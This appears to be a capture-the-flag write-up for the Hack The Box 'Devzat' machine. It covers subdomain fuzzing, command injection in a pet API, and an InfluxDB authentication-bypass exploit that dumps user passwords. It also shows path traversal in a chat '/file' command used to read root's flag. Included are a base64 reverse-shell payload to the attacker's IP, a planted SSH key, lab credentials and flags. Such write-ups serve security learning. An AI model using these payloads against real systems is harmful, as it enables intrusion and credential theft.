#--------------Enumeration----------------#
```
`Nmap Scan`

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://devzat.htb/
8000/tcp open  ssh     (protocol 2.0)
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
...
Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

add `devzat.htb` into `/etc/hosts`


`Subdomains scan`
```
└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --sc 200 -H "HOST:FUZZ.devzat.htb" http://devzat.htb/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://devzat.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000003745:   200        20 L     35 W       510 Ch      "pets - pets" 
```

add `pets.devzat.htb` into `/etc/hosts`

#--------------Foothold-----------------#

When we access `pets.devzat.htb` We find that we can add pet 

let's intercept it with burpsuite we find two sections `name & species`

First onn my machine i opened `http.server`

`python3 -m http.server`

tried to curl into my ip in different ways and finally yeah i could listen 

```
POST /api/pet HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Content-Type: text/plain;charset=UTF-8
Origin: http://pets.devzat.htb
Content-Length: 123
Connection: close

{"name":"njn",
"species":"bluewhale; curl http://10.10.14.11:8000"
}
```

so now we can inject to get reverse shell

i tried different payloads but nothing works :( 

then i tried to use base64 to bypass if there is filter payload `bash -i >& /dev/tcp/10.10.14.11/6666 0>&1`


```
POST /api/pet HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Content-Type: text/plain;charset=UTF-8
Origin: http://pets.devzat.htb
Content-Length: 123
Connection: close

{"name":"njn",
"species":"bluewhale; echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMS82NjY2IDA+JjE=' |base64 -d|bash"
}
```
and yeah we got reverse shell as patrick

then i get ssh connection by adding my public key into `authorized_keys`

`nc -lvp 6666`                                                                                                                                                         

```
listening on [any] 6666 ...
connect to [10.10.14.11] from devzat.htb [10.10.11.118] 39332
bash: cannot set terminal process group (869): Inappropriate ioctl for device
bash: no job control in this shell
patrick@devzat:~/pets$ cd ../.ssh
cd ../.ssh
patrick@devzat:~/.ssh$ ls
ls
authorized_keys
id_rsa
patrick@devzat:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQ4K5rw1eM+2IGYJ446sPGF0qSh4MmVqCuedxgB57nf/XrbcDcwfN+mV6Ms3zYZw6zmkHZ5xnwTgewT+z/HSenMf9zUHUQq2mnYliihteTlCsoEEAH71w2K3pjz+tVpMN7pd87E1pAUjLIbG78rmMO41c3H+FYZn7KmbQ8OihFY9z4XNcrm1+7Gh2poJoYoKNs36v5Er5rvJ+9q/AlZ8pQJr/u3gi5kIwSoSLU9bgvAzl+jy6m3yi1LFT6HAaVZi48vrTR/UjxCh+QKzPm9fSDsvjkhlsYCC8kGsS0O/G1WD5Z+HxeczSa6QKQSLoEpzJ9UAak4RNrhNYNVPG0RIuqCwsF3oz0sGLpldb3+zHiZAsLAGRDcZYZoSh528XV0NeKpx8aEZOlu4Fr1Bnn1B9uxCiaPddLLi9rTGMdY51aK+MC1gzYe6Dym4rjPPPXEXoHC+SOVBeCb014fxdPiakJCMhzG0BSk3VwhLHZ9EnH2Rw3wKr8i0HDgX+IutRbwR0= mido@kali" > authorized_keys
<w3wKr8i0HDgX+IutRbwR0= mido@kali" > authorized_keys
```

Now we can connect using `SSH`

Then we have to enumerate the devchat and after enumeration and reading the code it check for the user if admin or patrick or catherine 

i found that catherine can test on port 8443 the devchat so i used

`ssh -l catherine devzat.htb -p 8443`

From that we find two things

`influxdb version: 1.7.5` 
`backup files contains password and only accessed by catherine`

I searched for influxdb exploit found one https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933

i downloaded it into /tmp 

`wget https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933`

the required libs were not installed on the machine so i used ssh tunnel to run it 
```
└─$ ssh -L 8086:localhost:8086 patrick@10.10.11.118
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 25 Dec 2021 09:35:51 PM UTC

  System load:  0.0               Processes:                235
  Usage of /:   59.2% of 7.81GB   Users logged in:          1
  Memory usage: 22%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for eth0:    10.10.11.118


107 updates can be applied immediately.
33 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Dec 25 20:44:50 2021 from 10.10.14.11
```
Then time to run the exploit.py 

```
┌──(mido㉿kali)-[~/Downloads/InfluxDB-Exploit-CVE-2019-20933-master]
└─$ python3 __main__.py                                                                                                                                                                                                                   1 ⚙
  _____        __ _            _____  ____    ______            _       _ _   
 |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) |  
   | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_ 
   | | | '_ \|  _| | | | \ \/ / |  | |  _ <  |  __| \ \/ / '_ \| |/ _ \| | __|
  _| |_| | | | | | | |_| |>  <| |__| | |_) | | |____ >  <| |_) | | (_) | | |_ 
 |_____|_| |_|_| |_|\__,_/_/\_\_____/|____/  |______/_/\_\ .__/|_|\___/|_|\__|
                                                         | |                  
                                                         |_|                  
CVE-2019-20933

Insert ip host (default localhost): 
Insert port (default 8086): 
Insert influxdb user (wordlist path to bruteforce username): /usr/share/seclists/Usernames/top-usernames-shortlist.txt

Start username bruteforce
[x] ilovepumkinpie1
[x] wade
[x] root
[v] admin

Host vulnerable !!!  
Databases list:

1) devzat
2) _internal

Insert database name (exit to close): devzat
[devzat] Insert query (exit to change db): SELECT * FROM "devzat"
{
    "results": [
        {
            "statement_id": 0
        }
    ]
}

[devzat] Insert query (exit to change db): SHOW MEASUREMENTS
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "name"
                    ],
                    "name": "measurements",
                    "values": [
                        [
                            "user"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}


[devzat] Insert query (exit to change db): SELECT * FROM "user"
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "enabled",
                        "password",
                        "username"
                    ],
                    "name": "user",
                    "values": [
                        [
                            "2021-06-22T20:04:16.313965493Z",
                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-22T20:04:16.320782034Z",
                            true,
                            "woBeeYareedahc7Oogeephies7Aiseci",
                            "catherine"
                        ],
                        [
                            "2021-06-22T20:04:16.996682002Z",
                            true,
                            "RoyalQueenBee$",
                            "charles"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}

```


now we found creds `catherine:woBeeYareedahc7Oogeephies7Aiseci`

then we connect 

` patrick@devzat:~$ su catherine`


#----------------ROOT----------------#
```
catherine@devzat:/home$ cd catherine
catherine@devzat:~$ cat user.txt
04d0ad2cb72ef2ffaab6ea49db7bb20f

Let's unzip the backups that we read about before

catherine@devzat:~$ cd /var/backups/

catherine@devzat:/var/backups$ ls -la
total 140
drwxr-xr-x  2 root      root       4096 Sep 29 16:25 .
drwxr-xr-x 14 root      root       4096 Jun 22  2021 ..
-rw-r--r--  1 root      root      59142 Sep 28 18:45 apt.extended_states.0
-rw-r--r--  1 root      root       6588 Sep 21 20:17 apt.extended_states.1.gz
-rw-r--r--  1 root      root       6602 Jul 16 06:41 apt.extended_states.2.gz
-rw-------  1 catherine catherine 28297 Jul 16 07:00 devzat-dev.zip
-rw-------  1 catherine catherine 27567 Jul 16 07:00 devzat-main.zip

catherine@devzat:/var/backups$ unzip devzat-dev.zip -d /tmp
Archive:  devzat-dev.zip
   creating: /tmp/dev/
  inflating: /tmp/dev/go.mod         
 extracting: /tmp/dev/.gitignore     
  inflating: /tmp/dev/util.go        
  inflating: /tmp/dev/testfile.txt   
  inflating: /tmp/dev/eastereggs.go  
  inflating: /tmp/dev/README.md      
  inflating: /tmp/dev/games.go       
  inflating: /tmp/dev/colors.go      
 extracting: /tmp/dev/log.txt        
  inflating: /tmp/dev/commands.go    
  inflating: /tmp/dev/start.sh       
  inflating: /tmp/dev/devchat.go     
  inflating: /tmp/dev/LICENSE        
  inflating: /tmp/dev/commandhandler.go  
  inflating: /tmp/dev/art.txt        
  inflating: /tmp/dev/go.sum         
 extracting: /tmp/dev/allusers.json  
catherine@devzat:/var/backups$ unzip devzat-main.zip -d /tmp
Archive:  devzat-main.zip
   creating: /tmp/main/
  inflating: /tmp/main/go.mod        
 extracting: /tmp/main/.gitignore    
  inflating: /tmp/main/util.go       
  inflating: /tmp/main/eastereggs.go  
  inflating: /tmp/main/README.md     
  inflating: /tmp/main/games.go      
  inflating: /tmp/main/colors.go     
 extracting: /tmp/main/log.txt       
  inflating: /tmp/main/commands.go   
  inflating: /tmp/main/start.sh      
  inflating: /tmp/main/devchat.go    
  inflating: /tmp/main/LICENSE       
  inflating: /tmp/main/commandhandler.go  
  inflating: /tmp/main/art.txt       
  inflating: /tmp/main/go.sum        
  inflating: /tmp/main/allusers.json  
catherine@devzat:/var/backups$ cd /tmp
catherine@devzat:/tmp$ ls
dev          systemd-private-45c03f997bb4489584f0456271f4a95c-apache2.service-oEOVcf           systemd-private-45c03f997bb4489584f0456271f4a95c-systemd-timesyncd.service-y225yg
main         systemd-private-45c03f997bb4489584f0456271f4a95c-systemd-logind.service-D518Te    vmware-root_700-2730627996
__main__.py  systemd-private-45c03f997bb4489584f0456271f4a95c-systemd-resolved.service-toAqYh

```

Now let's find the different between them to find the password that we know already stored in one of them 

```

catherine@devzat:/tmp$ diff main dev
diff main/allusers.json dev/allusers.json
1,3c1
< {
<    "eff8e7ca506627fe15dda5e0e512fcaad70b6d520f37cc76597fdb4f2d83a1a3": "\u001b[38;5;214mtest\u001b[39m"
< }
---
> {}
diff main/commands.go dev/commands.go
3a4
>       "bufio"
4a6,7
>       "os"
>       "path/filepath"
36a40
>               file        = commandInfo{"file", "Paste a files content directly to chat [alpha]", fileCommand, 1, false, nil}
38c42,101
<       commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode}
---
>       commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode, file}
> }
> 
> func fileCommand(u *user, args []string) {
>       if len(args) < 1 {
>               u.system("Please provide file to print and the password")
>               return
>       }
> 
>       if len(args) < 2 {
>               u.system("You need to provide the correct password to use this function")
>               return
>       }
> 
>       path := args[0]
>       pass := args[1]
> 
>       // Check my secure password
>       if pass != "CeilingCatStillAThingIn2021?" {
>               u.system("You did provide the wrong password")
>               return
>       }
> 
>       // Get CWD
>       cwd, err := os.Getwd()
>       if err != nil {
>               u.system(err.Error())
>       }
> 
>       // Construct path to print
>       printPath := filepath.Join(cwd, path)
> 
>       // Check if file exists
>       if _, err := os.Stat(printPath); err == nil {
>               // exists, print
>               file, err := os.Open(printPath)
>               if err != nil {
>                       u.system(fmt.Sprintf("Something went wrong opening the file: %+v", err.Error()))
>                       return
>               }
>               defer file.Close()
> 
>               scanner := bufio.NewScanner(file)
>               for scanner.Scan() {
>                       u.system(scanner.Text())
>               }
> 
>               if err := scanner.Err(); err != nil {
>                       u.system(fmt.Sprintf("Something went wrong printing the file: %+v", err.Error()))
>               }
> 
>               return
> 
>       } else if os.IsNotExist(err) {
>               // does not exist, print error
>               u.system(fmt.Sprintf("The requested file @ %+v does not exist!", printPath))
>               return
>       }
>       // bokred?
>       u.system("Something went badly wrong.")
diff main/devchat.go dev/devchat.go
27c27
<       port = 8000
---
>       port = 8443
114c114
<               fmt.Sprintf(":%d", port),
---
>               fmt.Sprintf("127.0.0.1:%d", port),
Only in dev: testfile.txt

```

Now we got password `CeilingCatStillAThingIn2021?`

let's connect again to devchat and catherine and use the /file command `file - Paste a files content directly to chat [alpha]`

```
catherine@devzat:/tmp$ netstat -ltpn
(No info could be read for "-p": geteuid()=1001 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8086          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::8000                 :::*                    LISTEN      -                   
catherine@devzat:/tmp$ ssh -l catherine devzat.htb -p 8443
The authenticity of host '[devzat.htb]:8443 ([127.0.0.1]:8443)' can't be established.
ED25519 key fingerprint is SHA256:liAkhV56PrAa5ORjJC5MU4YSl8kfNXp+QuljetKw0XU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[devzat.htb]:8443' (ED25519) to the list of known hosts.
patrick: Hey Catherine, glad you came.
catherine: Hey bud, what are you up to?
patrick: Remember the cool new feature we talked about the other day?
catherine: Sure
patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.
catherine: Kinda busy right now 👔
patrick: That's perfectly fine 👍  You'll need a password which you can gather from the source. I left it in our default backups location.
catherine: k
patrick: I also put the main so you could diff main dev if you want.
catherine: Fine. As soon as the boss let me off the leash I will check it out.
patrick: Cool. I am very curious what you think of it. Consider it alpha state, though. Might not be secure yet. See ya!
devbot: patrick has left the chat
Welcome to the chat. There are no more users
devbot: catherine has joined the chat
catherine: /help
[SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat
[SYSTEM] Because there's SSH apps on all platforms, even on mobile, you can join from anywhere.
[SYSTEM] 
[SYSTEM] Interesting features:
[SYSTEM] • Many, many commands. Run /commands.
[SYSTEM] • Rooms! Run /room to see all rooms and use /room #foo to join a new room.
[SYSTEM] • Markdown support! Tables, headers, italics and everything. Just use in place of newlines.
[SYSTEM] • Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an example.
[SYSTEM] • Direct messages! Send a quick DM using =user <msg> or stay in DMs by running /room @user.
[SYSTEM] • Timezone support, use /tz Continent/City to set your timezone.
[SYSTEM] • Built in Tic Tac Toe and Hangman! Run /tic or /hang <word> to start new games.
[SYSTEM] • Emoji replacements! (like on Slack and Discord)
[SYSTEM] 
[SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php.
[SYSTEM] 
[SYSTEM] Made by Ishan Goel with feature ideas from friends.
[SYSTEM] Thanks to Caleb Denio for lending his server!
[SYSTEM] 
[SYSTEM] For a list of commands run
[SYSTEM] ┃ /commands
catherine: /commands
[SYSTEM] Commands
[SYSTEM] clear - Clears your terminal
[SYSTEM] message - Sends a private message to someone
[SYSTEM] users - Gets a list of the active users
[SYSTEM] all - Gets a list of all users who has ever connected
[SYSTEM] exit - Kicks you out of the chat incase your client was bugged
[SYSTEM] bell - Toggles notifications when you get pinged
[SYSTEM] room - Changes which room you are currently in
[SYSTEM] id - Gets the hashed IP of the user
[SYSTEM] commands - Get a list of commands
[SYSTEM] nick - Change your display name
[SYSTEM] color - Change your display name color
[SYSTEM] timezone - Change how you view time
[SYSTEM] emojis - Get a list of emojis you can use
[SYSTEM] help - Get generic info about the server
[SYSTEM] tictactoe - Play tictactoe
[SYSTEM] hangman - Play hangman
[SYSTEM] shrug - Drops a shrug emoji
[SYSTEM] ascii-art - Bob ross with text
[SYSTEM] example-code - Hello world!
[SYSTEM] file - Paste a files content directly to chat [alpha]
catherine: /file
[SYSTEM] Please provide file to print and the password
catherine: /file /root/root.txt CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/devzat/root/root.txt does not exist!
catherine: /file ~/root/root.txt CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/devzat/~/root/root.txt does not exist!
                                                                                                                                                                                                                                1 minute in
catherine: /file /etc/passwd CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/devzat/etc/passwd does not exist!
catherine: /file ../root.txt CeilingCatStillAThingIn2021?
[SYSTEM] 6aaefe85cf21ba894f12bead6588614e
catherine: 
```


#Done 00




